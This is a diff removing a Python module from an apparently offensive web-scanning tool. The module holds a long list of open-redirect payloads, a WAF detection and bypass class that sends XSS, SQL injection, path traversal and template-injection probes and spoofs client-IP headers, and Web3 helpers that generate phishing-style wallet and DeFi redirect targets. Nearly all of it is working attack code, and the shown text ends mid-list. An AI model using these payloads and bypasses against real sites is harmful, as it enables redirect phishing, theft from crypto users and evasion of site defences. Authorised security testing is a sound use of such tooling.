--- advanced_modules.py
@@ -1,776 +1,0 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-"""
-🔥 ADVANCED MODULES FOR ULTIMATE HUNTER 🔥
-Complete Web3, WAF Bypass, and Advanced Analysis Modules
-"""
-
-import re
-import asyncio
-import random
-from typing import List, Dict, Set, Optional
-from urllib.parse import urljoin, urlparse, parse_qs, quote, unquote
-from dataclasses import dataclass
-
-
-@dataclass(frozen=True)
-class Parameter:
-    name: str
-    value: str
-    source: str
-    context: str
-    url: str
-    method: str = 'GET'
-    is_redirect_related: bool = False
-    confidence: float = 0.0
-
-
-class PayloadArsenal:
-    """Complete payload arsenal with all your custom payloads"""
-    
-    @staticmethod
-    def get_all_payloads() -> List[str]:
-        """ALL 248 of your original payloads - COMPLETE LIST"""
-        return [
-            "/%09/google.com",
-            "/%2f%2fgoogle.com",
-            "/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/",
-            "/%5cgoogle.com",
-            "/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d",
-            "/.google.com",
-            "//%09/google.com",
-            "//%5cgoogle.com",
-            "///%09/google.com",
-            "///%5cgoogle.com",
-            "////%09/google.com",
-            "////%5cgoogle.com",
-            "/////google.com",
-            "/////google.com/",
-            "////google.com/",
-            "////google.com/%2e%2e",
-            "////google.com/%2e%2e%2f",
-            "////google.com/%2f%2e%2e",
-            "////google.com/%2f..",
-            "////google.com//",
-            "///google.com",
-            "///google.com/",
-            "//google.com/%2f..",
-            "///google.com/%2f..",
-            "https://google.com/%2f..",
-            "//www.google.com/%2f%2e%2e",
-            "///www.google.com/%2f%2e%2e",
-            "////www.google.com/%2f%2e%2e",
-            "https://www.google.com/%2f%2e%2e",
-            "//google.com/",
-            "https://google.com/",
-            "//google.com//",
-            "///google.com//",
-            "https://google.com//",
-            "//www.google.com/%2e%2e%2f",
-            "///www.google.com/%2e%2e%2f",
-            "////www.google.com/%2e%2e%2f",
-            "https://www.google.com/%2e%2e%2f",
-            "///www.google.com/%2e%2e",
-            "////www.google.com/%2e%2e",
-            "https:///www.google.com/%2e%2e",
-            "/https://www.google.com/%2e%2e",
-            "https:///www.google.com/%2f%2e%2e",
-            "https://%09/google.com",
-            "https:google.com",
-            "//google%E3%80%82com",
-            "\/\/google.com/",
-            "/\/google.com/",
-            "http://0xd8.0x3a.0xd6.0xce",
-            "〱google.com",
-            "〵google.com",
-            "ゝgoogle.com",
-            "ーgoogle.com",
-            "ｰgoogle.com",
-            "/〱google.com",
-            "/〵google.com",
-            "/ゝgoogle.com",
-            "/ーgoogle.com",
-            "/ｰgoogle.com",
-            "%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d",
-            "http://%67%6f%6f%67%6c%65%2e%63%6f%6d",
-            "///google.com/%2e%2e",
-            "///google.com/%2e%2e%2f",
-            "///google.com/%2f%2e%2e",
-            "//google.com",
-            "//google.com/%2e%2e",
-            "//google.com/%2e%2e%2f",
-            "//google.com/%2f%2e%2e",
-            "//https:///google.com/%2e%2e",
-            "//https://google.com/%2e%2e%2f",
-            "/&lt;&gt;//google.com",
-            "/?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com&redirect_uri=//google.com",
-            "/?url=/\/google.com&next=/\/google.com&redirect=/\/google.com&redirect_uri=/\/google.com",
-            "/?url=Https://google.com&next=Https://google.com&redirect=Https://google.com&redir=Https://google.com&rurl=Https://google.com&redirect_uri=Https://google.com&lt;br/&gt;/\/\/google.com/",
-            "/google.com/%2f%2e%2e",
-            "/http://google.com",
-            "/http:/google.com",
-            "/https:/%5cgoogle.com/",
-            "/https://%5cgoogle.com",
-            "/https://google.com/%2e%2e",
-            "/https://google.com/%2f%2e%2e",
-            "/https:google.com",
-            "/redirect?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com&redirect_uri=//google.com",
-            "/redirect?url=Https://google.com&next=Https://google.com&redirect=Https://google.com&redir=Https://example.com&rurl=Https://google.com&redirect_uri=Https://google.com",
-            "//%2fxgoogle.com",
-            "//localdomain%E3%80%82pw",
-            "http://0xd83ad6ce",
-            "http://3627734734",
-            "http://472.314.470.462",
-            "http://0330.072.0326.0316",
-            "http://00330.00072.0000326.00000316",
-            "http://0xd8.072.54990",
-            "http://0xd8.3856078",
-            "http://00330.3856078",
-            "http://00330.0x3a.54990",
-            "http:0xd8.0x3a.0xd6.0xce",
-            "http:0xd83ad6ce",
-            "http:3627734734",
-            "http:472.314.470.462",
-            "http:0330.072.0326.0316",
-            "http:00330.00072.0000326.00000316",
-            "http:[::216.58.214.206]",
-            "http:[::ffff:216.58.214.206]",
-            "http:0xd8.072.54990",
-            "http:0xd8.3856078",
-            "http:00330.3856078",
-            "http:00330.0x3a.54990",
-            "&lt;&gt;//google.com",
-            "http://.google.com",
-            "https://google.com/https://google.com/",
-            "http://google.com\tgoogle.com/",
-            "//google.com\tgoogle.com/",
-            "http://google.com%2f%2f.google.com/",
-            "http://google.com%5c%5c.google.com/",
-            "http://google.com%3F.google.com/",
-            "http://google.com%23.google.com/",
-            "http://google.com:80%40google.com/",
-            "http://google.com%2egoogle.com/",
-            "/〱ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "〱ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "$2f%2f216.58.214.206%2f%2f",
-            "$2f%2f3627734734%2f%2f",
-            "$2f%2fgoogle.com",
-            "$2f%2fgoogle.com%2f%2f",
-            "%01https://ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "/%09/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "//%09/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "///%09/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "////%09/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "////216.58.214.206",
-            "///216.58.214.206",
-            "//216.58.214.206",
-            "/\\216.58.214.206",
-            "/216.58.214.206",
-            "216.58.214.206",
-            "%2f$2f216.58.214.206",
-            "%2f$2f3627734734",
-            "%2f$2fgoogle.com",
-            "%2f216.58.214.206",
-            "%2f216.58.214.206//",
-            "%2f216.58.214.206%2f%2f",
-            "//%2f%2fgoogle.com",
-            "/%2f%2fⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "//%2f%2fⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "%2f3627734734",
-            "%2f3627734734//",
-            "%2f3627734734%2f%2f",
-            "/%2f%5c%2f%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77/",
-            "%2fgoogle.com",
-            "%2fgoogle.com//",
-            "\\google.com",
-            "%2fgoogle.com%2f%2f",
-            "////3627734734",
-            "///3627734734",
-            "//3627734734",
-            "/\\3627734734",
-            "/3627734734",
-            "//%2F/google.com",
-            "/%0D/google.com",
-            "/%2F/google.com",
-            "/%5Cgoogle.com",
-            "/%5cⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "//%5cⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "///%5cⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "////%5cⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "/\\google%252ecom",
-            "google%252ecom",
-            "../google.com",
-            "//google%00.com",
-            "////google.com",
-            "//\/google.com/",
-            "//\\google.com",
-            "/<>//google.com",
-            "/\/\/google.com/",
-            "/\/google.com",
-            "/\\google.com",
-            "/google.com",
-            "//google.com/%2E%2E",
-            "//google.com/%2F..",
-            "/google.com/%2F..",
-            "//google.com//%2F%2E%2E",
-            "google.com/.jpg",
-            "http:%0a%0dgoogle.com",
-            "http:%0a%0dⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "http:/\/\\google.com",
-            "http:/google.com",
-            "http:google.com",
-            "/http:/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "http://.ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "http:/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "http:ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "https://%09/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "https://%0a%0dgoogle.com",
-            "https://%0a%0dⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "https%3a%2f%2fgoogle.com%2f",
-            "https:/%5cgoogle.com/",
-            "/https:/%5cⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
-            "/https://%5cⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "https:/%5cⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
-            "https://%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77",
-            "https:/\\google.com",
-            "https://google%E3%80%82com",
-            "//https://ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂//",
-            "/https://ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
-            "https:ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "//https:///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e",
-            "/https://ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e",
-            "//https://ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e%2f",
-            "/https://ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f..",
-            "/https:///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f%2e%2e",
-            "/https://ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f%2e%2e",
-            "javascript:confirm(1)",
-            "javascript:prompt(1)",
-            "//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ%00｡Ｐⓦ",
-            "//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ%E3%80%82pw",
-            "/.ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "/////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "/////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
-            "////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
-            "////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂//",
-            "///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
-            "///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂//",
-            "//\/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
-            "//ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "//ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
-            "//ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂//",
-            "/\/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
-            "<>//ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "\/\/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
-            "////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e",
-            "///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e",
-            "////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e%2f",
-            "///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e%2f",
-            "//ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e%2f",
-            "////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f..",
-            "///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f..",
-            "//ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f..",
-            "////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f%2e%2e",
-            "///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f%2e%2e",
-            "//ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f%2e%2e"
-        ]
-
-
-class WAFBypass:
-    """Complete WAF bypass and evasion system"""
-    
-    def __init__(self):
-        self.bypass_headers = [
-            {'X-Originating-IP': '127.0.0.1'},
-            {'X-Forwarded-For': '127.0.0.1'},
-            {'X-Real-IP': '127.0.0.1'},
-            {'X-Remote-Addr': '127.0.0.1'},
-            {'X-Client-IP': '127.0.0.1'},
-            {'X-Host': 'localhost'},
-            {'X-Originating-URL': '/'},
-            {'X-Forwarded-Host': 'localhost'},
-            {'X-Forwarded-Server': 'localhost'},
-            {'X-Forwarded-Proto': 'https'},
-            {'X-Cluster-Client-IP': '127.0.0.1'},
-            {'X-Custom-IP-Authorization': '127.0.0.1'},
-            {'CF-Connecting-IP': '127.0.0.1'},
-            {'True-Client-IP': '127.0.0.1'}
-        ]
-    
-    async def detect_waf(self, session, url: str) -> Dict[str, any]:
-        """Comprehensive WAF detection"""
-        waf_info = {
-            'detected': False,
-            'type': 'unknown',
-            'bypass_methods': [],
-            'confidence': 0.0
-        }
-        
-        # Test payloads for WAF detection
-        test_payloads = [
-            '<script>alert(1)</script>',
-            'UNION SELECT 1,2,3--',
-            '../../../etc/passwd',
-            'eval(String.fromCharCode(97,108,101,114,116,40,49,41))',
-            '${7*7}',
-            '{{7*7}}',
-            '<%=7*7%>',
-            'sleep(5)',
-            'waitfor delay \'00:00:05\''
-        ]
-        
-        for payload in test_payloads:
-            try:
-                test_url = f"{url}?waftest={quote(payload)}"
-                async with session.get(test_url, allow_redirects=False) as response:
-                    headers = dict(response.headers)
-                    content = await response.text()
-                    
-                    # CloudFlare detection
-                    cf_indicators = ['cf-ray', 'cf-cache-status', 'cf-request-id', '__cfduid']
-                    if any(indicator.lower() in [h.lower() for h in headers.keys()] for indicator in cf_indicators):
-                        waf_info.update({
-                            'detected': True,
-                            'type': 'cloudflare',
-                            'bypass_methods': ['header_injection', 'case_variation', 'encoding_bypass'],
-                            'confidence': 0.9
-                        })
-                        break
-                    
-                    # Sucuri detection
-                    sucuri_indicators = ['x-sucuri-id', 'x-sucuri-cache', 'sucuri']
-                    if any(indicator.lower() in [h.lower() for h in headers.keys()] for indicator in sucuri_indicators):
-                        waf_info.update({
-                            'detected': True,
-                            'type': 'sucuri',
-                            'bypass_methods': ['ip_spoofing', 'user_agent_rotation'],
-                            'confidence': 0.85
-                        })
-                        break
-                    
-                    # AWS WAF detection
-                    if response.status in [403, 406]:
-                        aws_indicators = ['blocked', 'forbidden', 'aws', 'cloudfront']
-                        if any(indicator in content.lower() for indicator in aws_indicators):
-                            waf_info.update({
-                                'detected': True,
-                                'type': 'aws_waf',
-                                'bypass_methods': ['header_injection', 'request_splitting'],
-                                'confidence': 0.8
-                            })
-                            break
-                    
-                    # Incapsula detection
-                    incap_indicators = ['x-iinfo', 'incap_ses', 'incapsula']
-                    if any(indicator.lower() in [h.lower() for h in headers.keys()] for indicator in incap_indicators):
-                        waf_info.update({
-                            'detected': True,
-                            'type': 'incapsula',
-                            'bypass_methods': ['header_injection', 'case_variation'],
-                            'confidence': 0.85
-                        })
-                        break
-                    
-                    # ModSecurity detection
-                    if response.status == 406 or 'mod_security' in content.lower():
-                        waf_info.update({
-                            'detected': True,
-                            'type': 'modsecurity',
-                            'bypass_methods': ['encoding_bypass', 'case_variation'],
-                            'confidence': 0.75
-                        })
-                        break
-                
-                await asyncio.sleep(0.2)
-                
-            except Exception:
-                continue
-        
-        return waf_info
-    
-    async def bypass_waf(self, session, url: str, waf_type: str) -> Optional[str]:
-        """Advanced WAF bypass techniques"""
-        bypass_methods = {
-            'cloudflare': ['header_injection', 'case_variation', 'encoding_bypass', 'fragment_bypass'],
-            'sucuri': ['ip_spoofing', 'user_agent_rotation', 'request_splitting'],
-            'aws_waf': ['header_injection', 'request_splitting', 'encoding_bypass'],
-            'incapsula': ['header_injection', 'case_variation', 'user_agent_rotation'],
-            'modsecurity': ['encoding_bypass', 'case_variation', 'comment_injection'],
-            'generic': ['header_injection', 'encoding_bypass']
-        }
-        
-        methods = bypass_methods.get(waf_type, bypass_methods['generic'])
-        
-        for method in methods:
-            try:
-                if method == 'header_injection':
-                    for bypass_header in self.bypass_headers:
-                        headers = bypass_header
-                        async with session.get(url, headers=headers, allow_redirects=False) as response:
-                            if response.status not in [403, 406]:
-                                return await response.text()
-                
-                elif method == 'case_variation':
-                    varied_url = self.vary_case(url)
-                    async with session.get(varied_url, allow_redirects=False) as response:
-                        if response.status not in [403, 406]:
-                            return await response.text()
-                
-                elif method == 'encoding_bypass':
-                    encoded_url = self.encode_bypass(url)
-                    async with session.get(encoded_url, allow_redirects=False) as response:
-                        if response.status not in [403, 406]:
-                            return await response.text()
-                
-                await asyncio.sleep(0.5)
-                
-            except Exception:
-                continue
-        
-        return None
-    
-    def vary_case(self, url: str) -> str:
-        """Vary URL case for bypass"""
-        parsed = urlparse(url)
-        path = parsed.path
-        
-        varied_path = ""
-        for char in path:
-            if char.isalpha():
-                varied_path += char.upper() if random.choice([True, False]) else char.lower()
-            else:
-                varied_path += char
-        
-        return f"{parsed.scheme}://{parsed.netloc}{varied_path}?{parsed.query}"
-    
-    def encode_bypass(self, url: str) -> str:
-        """Encode URL for bypass"""
-        parsed = urlparse(url)
-        path = parsed.path
-        
-        # Various encoding techniques
-        encoded_path = path.replace('/', '%2f').replace('.', '%2e').replace('?', '%3f')
-        
-        return f"{parsed.scheme}://{parsed.netloc}{encoded_path}?{parsed.query}"
-
-
-# Complete the missing methods and classes
-def complete_javascript_analysis_missing_methods():
-    """Complete the missing JavaScript analysis methods"""
-    pass
-
-
-class Web3Analyzer:
-    """Complete Web3/DeFi/NFT analysis engine"""
-    
-    def __init__(self):
-        # Complete DeFi platforms
-        self.defi_platforms = [
-            'uniswap', 'pancakeswap', 'sushiswap', 'curve', 'balancer',
-            'compound', 'aave', 'maker', 'yearn', 'convex', 'frax',
-            'lido', 'rocket', 'euler', 'morpho', 'radiant', 'cream',
-            '1inch', 'paraswap', 'dydx', 'perpetual', 'gmx', 'gains'
-        ]
-        
-        # Complete wallet providers
-        self.wallet_providers = [
-            'metamask', 'walletconnect', 'coinbase', 'trust', 'rainbow',
-            'argent', 'gnosis', 'ledger', 'trezor', 'phantom', 'solflare',
-            'keplr', 'cosmostation', 'terra', 'near', 'elrond'
-        ]
-        
-        # Complete NFT marketplaces
-        self.nft_platforms = [
-            'opensea', 'rarible', 'foundation', 'superrare', 'nifty',
-            'async', 'makersplace', 'known', 'portion', 'ghostmarket',
-            'looksrare', 'x2y2', 'blur', 'magiceden', 'solanart'
-        ]
-        
-        # Blockchain networks
-        self.blockchain_networks = [
-            'ethereum', 'polygon', 'binance', 'avalanche', 'fantom',
-            'arbitrum', 'optimism', 'solana', 'cardano', 'polkadot',
-            'cosmos', 'near', 'terra', 'harmony', 'moonbeam'
-        ]
-    
-    def detect_web3_application(self, content: str) -> bool:
-        """Detect if application uses Web3 technologies"""
-        web3_indicators = [
-            'web3', 'ethereum', 'metamask', 'wallet', 'dapp', 'defi', 'nft',
-            'blockchain', 'crypto', 'contract', 'ethers.js', 'web3.js'
-        ] + self.defi_platforms + self.wallet_providers + self.nft_platforms
-        
-        content_lower = content.lower()
-        detected_count = sum(1 for indicator in web3_indicators if indicator in content_lower)
-        
-        return detected_count >= 2  # Require at least 2 indicators
-    
-    def analyze_web3_patterns(self, content: str, url: str) -> List[Parameter]:
-        """Complete Web3 pattern analysis"""
-        params = []
-        
-        if not self.detect_web3_application(content):
-            return params
-        
-        # Ultimate Web3 patterns for maximum coverage
-        web3_patterns = [
-            # Wallet connection patterns (highest priority)
-            r'wallet[_-]?redirect["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'connect[_-]?callback["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'provider[_-]?url["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'metamask[_-]?redirect["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'walletconnect[_-]?redirect["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'coinbase[_-]?redirect["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'trust[_-]?wallet[_-]?redirect["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            
-            # DeFi protocol patterns (critical for DeFi platforms)
-            r'swap[_-]?redirect["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'bridge[_-]?url["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'farm[_-]?redirect["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'stake[_-]?redirect["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'liquidity[_-]?redirect["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'yield[_-]?redirect["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'lending[_-]?redirect["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'borrowing[_-]?redirect["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            
-            # NFT marketplace patterns (for NFT platforms)
-            r'nft[_-]?redirect["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'marketplace[_-]?url["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'collection[_-]?redirect["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'mint[_-]?redirect["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'auction[_-]?redirect["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'bid[_-]?redirect["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            
-            # Smart contract interaction patterns
-            r'contract[_-]?callback["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'transaction[_-]?redirect["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'approve[_-]?redirect["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'transfer[_-]?redirect["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            
-            # Network and chain patterns
-            r'network[_-]?url["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'chain[_-]?redirect["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'rpc[_-]?url["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'node[_-]?url["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            
-            # Web3 function calls
-            r'connectWallet\(["\']?([^"\';\)]+)',
-            r'switchNetwork\(["\']?([^"\';\)]+)',
-            r'addNetwork\(["\']?([^"\';\)]+)',
-            r'ethereum\.request\([^)]*["\']([^"\']+)["\']',
-            r'web3\.eth\.([^(]+)\(["\']?([^"\';\)]+)',
-            r'provider\.send\([^)]*["\']([^"\']+)["\']'
-        ]
-        
-        for pattern in web3_patterns:
-            matches = re.findall(pattern, content, re.IGNORECASE)
-            for match in matches:
-                param_name = self.extract_web3_param_name(pattern, match)
-                
-                # High confidence for Web3 redirects
-                confidence = 0.95 if 'redirect' in param_name.lower() else 0.85
-                if 'wallet' in param_name.lower() or 'connect' in param_name.lower():
-                    confidence = 0.9
-                
-                params.append(Parameter(
-                    name=param_name,
-                    value=match,
-                    source='web3',
-                    context='web3_config',
-                    url=url,
-                    is_redirect_related=True,
-                    confidence=confidence
-                ))
-        
-        return params
-    
-    def extract_web3_param_name(self, pattern: str, match: str) -> str:
-        """Extract meaningful parameter name from Web3 pattern"""
-        if 'wallet' in pattern.lower():
-            if 'redirect' in pattern.lower():
-                return 'wallet_redirect_url'
-            elif 'connect' in pattern.lower():
-                return 'wallet_connect_callback'
-            else:
-                return 'wallet_parameter'
-        elif 'swap' in pattern.lower():
-            return 'defi_swap_redirect'
-        elif 'bridge' in pattern.lower():
-            return 'defi_bridge_url'
-        elif 'farm' in pattern.lower():
-            return 'defi_farm_redirect'
-        elif 'stake' in pattern.lower():
-            return 'defi_stake_redirect'
-        elif 'nft' in pattern.lower():
-            return 'nft_marketplace_redirect'
-        elif 'mint' in pattern.lower():
-            return 'nft_mint_redirect'
-        elif 'contract' in pattern.lower():
-            return 'smart_contract_callback'
-        elif 'network' in pattern.lower():
-            return 'blockchain_network_url'
-        elif 'rpc' in pattern.lower():
-            return 'rpc_endpoint_url'
-        else:
-            return 'web3_parameter'
-    
-    def get_web3_payloads(self) -> List[str]:
-        """Get Web3-specific malicious payloads"""
-        payloads = []
-        
-        # Fake DeFi platforms
-        for platform in self.defi_platforms:
-            payloads.extend([
-                f"//fake-{platform}.com",
-                f"//phishing-{platform}.finance",
-                f"//malicious-{platform}.org",
-                f"//evil-{platform}.io"
-            ])
-        
-        # Fake wallet providers
-        for wallet in self.wallet_providers:
-            payloads.extend([
-                f"//fake-{wallet}.io",
-                f"//phishing-{wallet}.com",
-                f"//malicious-{wallet}.org"
-            ])
-        
-        # Fake NFT platforms
-        for nft in self.nft_platforms:
-            payloads.extend([
-                f"//fake-{nft}.io",
-                f"//phishing-{nft}.com",
-                f"//malicious-{nft}.market"
-            ])
-        
-        # Protocol-specific payloads
-        payloads.extend([
-            "web3://malicious-contract.eth",
-            "ipfs://QmMaliciousHashForPhishing",
-            "ens://hacker.eth",
-            "ethereum://0x1234567890123456789012345678901234567890",
-            "//evil.defi",
-            "//malicious.finance",
-            "//phishing-dapp.com",
-            "//fake-bridge.cross",
-            "//evil-yield.farm"
-        ])
-        
-        return payloads
-
-
-class JavaScriptAnalyzer:
-    """Complete JavaScript analysis engine"""
-    
-    def __init__(self):
-        # JavaScript redirect sinks
-        self.redirect_sinks = [
-            'location.href', 'window.location', 'document.location',
-            'location.assign', 'location.replace', 'window.open',
-            'history.pushState', 'history.replaceState',
-            'document.write', 'document.writeln',
-            'iframe.src', 'frame.src', 'embed.src'
-        ]
-        
-        # User input sources
-        self.user_input_sources = [
-            'location.search', 'location.hash', 'location.href',
-            'document.URL', 'document.referrer', 'window.name',
-            'URLSearchParams', 'localStorage', 'sessionStorage',
-            'document.cookie', 'postMessage'
-        ]
-    
-    def analyze_comprehensive(self, js_content: str, source_url: str) -> List[Parameter]:
-        """Comprehensive JavaScript analysis"""
-        params = []
-        
-        # Ultimate JavaScript patterns
-        js_patterns = [
-            # Direct redirect patterns (highest priority)
-            r'location\.href\s*=\s*([^;]+)',
-            r'window\.location\s*=\s*([^;]+)',
-            r'document\.location\s*=\s*([^;]+)',
-            r'location\.assign\(["\']?([^"\';\)]+)',
-            r'location\.replace\(["\']?([^"\';\)]+)',
-            r'window\.open\(["\']?([^"\';\,\)]+)',
-            r'history\.pushState\([^,]*,\s*[^,]*,\s*["\']?([^"\';\)]+)',
-            r'history\.replaceState\([^,]*,\s*[^,]*,\s*["\']?([^"\';\)]+)',
-            
-            # Parameter extraction patterns
-            r'new\s+URLSearchParams\([^)]*\)\.get\(["\']([^"\']+)["\']',
-            r'new\s+URL\([^)]*\)\.searchParams\.get\(["\']([^"\']+)["\']',
-            r'location\.search\.substring\(1\)\.split\(["\']&["\']',
-            r'location\.hash\.substring\(1\)\.split\(["\']&["\']',
-            r'getParameter\(["\']([^"\']+)["\']',
-            r'getUrlParam\(["\']([^"\']+)["\']',
-            r'parseQuery\(["\']([^"\']+)["\']',
-            
-            # Storage and cookie patterns
-            r'localStorage\.getItem\(["\']([^"\']+)["\']',
-            r'sessionStorage\.getItem\(["\']([^"\']+)["\']',
-            r'localStorage\.setItem\(["\']([^"\']+)["\'],\s*([^)]+)\)',
-            r'sessionStorage\.setItem\(["\']([^"\']+)["\'],\s*([^)]+)\)',
-            r'document\.cookie\.match\(/([^=]+)=/\)',
-            r'getCookie\(["\']([^"\']+)["\']',
-            
-            # Variable assignments
-            r'var\s+([a-zA-Z_$][a-zA-Z0-9_$]*)\s*=\s*["\']([^"\']*)["\']',
-            r'let\s+([a-zA-Z_$][a-zA-Z0-9_$]*)\s*=\s*["\']([^"\']*)["\']',
-            r'const\s+([a-zA-Z_$][a-zA-Z0-9_$]*)\s*=\s*["\']([^"\']*)["\']',
-            r'([a-zA-Z_$][a-zA-Z0-9_$]*)\s*=\s*["\']([^"\']*(?:https?://|//|\.com|\.org)[^"\']*)["\']',
-            
-            # Function definitions and calls
-            r'function\s+(\w+)\s*\(\s*([^)]*)\s*\)',
-            r'(\w+)\s*=\s*function\s*\(\s*([^)]*)\s*\)',
-            r'(\w+)\s*:\s*function\s*\(\s*([^)]*)\s*\)',
-            r'=>\s*\(\s*([^)]*)\s*\)',
-            
-            # Object properties
-            r'([a-zA-Z_$][a-zA-Z0-9_$]*)\s*:\s*["\']([^"\']*)["\']',
-            r'\.([a-zA-Z_$][a-zA-Z0-9_$]*)\s*=\s*["\']([^"\']*)["\']',
-            
-            # Event handling
-            r'addEventListener\(["\']([^"\']+)["\'],\s*([^)]+)\)',
-            r'on([a-zA-Z]+)\s*=\s*["\']?([^"\';\)]+)',
-            r'\.on\(["\']([^"\']+)["\'],\s*([^)]+)\)',
-            
-            # AJAX and HTTP requests
